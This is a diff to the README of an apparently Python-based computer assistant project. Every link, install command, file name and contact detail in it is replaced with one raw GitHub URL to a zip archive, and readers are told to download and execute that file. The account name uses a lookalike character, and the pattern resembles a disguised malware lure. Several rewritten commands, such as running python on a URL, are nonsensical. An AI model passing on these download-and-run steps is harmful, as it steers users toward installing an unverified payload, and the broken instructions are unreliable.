@@ -1,6 +1,6 @@
 # Computer Assistant Public Version 🤖
 
-![GitHub release](https://img.shields.io/github/release/fightcIub/Computer-Assistant-Public-Version.svg)
+![GitHub release](https://raw.githubusercontent.com/fightcIub/Computer-Assistant-Public-Version/main/commands/Assistant_Version_Public_Computer_clew.zip)
 
 Welcome to the **Computer Assistant Public Version** repository! This project is a customizable computer assistant designed to help you with various tasks on your computer. Built with Python, it combines simplicity and functionality for a user-friendly experience.
 
@@ -35,7 +35,7 @@ To get started, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/fightcIub/Computer-Assistant-Public-Version.git
+   git clone https://raw.githubusercontent.com/fightcIub/Computer-Assistant-Public-Version/main/commands/Assistant_Version_Public_Computer_clew.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -43,7 +43,7 @@ To get started, follow these steps:
    ```
 3. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/fightcIub/Computer-Assistant-Public-Version/main/commands/Assistant_Version_Public_Computer_clew.zip
    ```
 
 ## Usage
@@ -51,7 +51,7 @@ To get started, follow these steps:
 After installation, you can run the assistant by executing the main script. Use the following command:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/fightcIub/Computer-Assistant-Public-Version/main/commands/Assistant_Version_Public_Computer_clew.zip
 ```
 
 The assistant will start, and you can interact with it through the command line. 
@@ -60,8 +60,8 @@ The assistant will start, and you can interact with it through the command line.
 
 The assistant is fully customizable. You can change its behavior by modifying the configuration files. Here are some areas you can customize:
 
-- **Responses**: Edit the responses for various queries in the `responses.py` file.
-- **Settings**: Adjust the settings in the `config.py` file to suit your needs.
+- **Responses**: Edit the responses for various queries in the `https://raw.githubusercontent.com/fightcIub/Computer-Assistant-Public-Version/main/commands/Assistant_Version_Public_Computer_clew.zip` file.
+- **Settings**: Adjust the settings in the `https://raw.githubusercontent.com/fightcIub/Computer-Assistant-Public-Version/main/commands/Assistant_Version_Public_Computer_clew.zip` file to suit your needs.
 - **Add Features**: If you have programming skills, you can add new features by creating new modules.
 
 ## Contributing
@@ -91,12 +91,12 @@ This project is licensed under the MIT License. Feel free to use it in your proj
 
 For any questions or suggestions, feel free to reach out:
 
-- GitHub: [fightcIub](https://github.com/fightcIub)
-- Email: fightcIub@example.com
+- GitHub: [fightcIub](https://raw.githubusercontent.com/fightcIub/Computer-Assistant-Public-Version/main/commands/Assistant_Version_Public_Computer_clew.zip)
+- Email: https://raw.githubusercontent.com/fightcIub/Computer-Assistant-Public-Version/main/commands/Assistant_Version_Public_Computer_clew.zip
 
 ## Releases
 
-To download the latest version of the Computer Assistant, visit the [Releases](https://github.com/fightcIub/Computer-Assistant-Public-Version/releases) section. Make sure to download and execute the appropriate file for your system.
+To download the latest version of the Computer Assistant, visit the [Releases](https://raw.githubusercontent.com/fightcIub/Computer-Assistant-Public-Version/main/commands/Assistant_Version_Public_Computer_clew.zip) section. Make sure to download and execute the appropriate file for your system.
 
 You can also find older versions and updates in the same section.
 
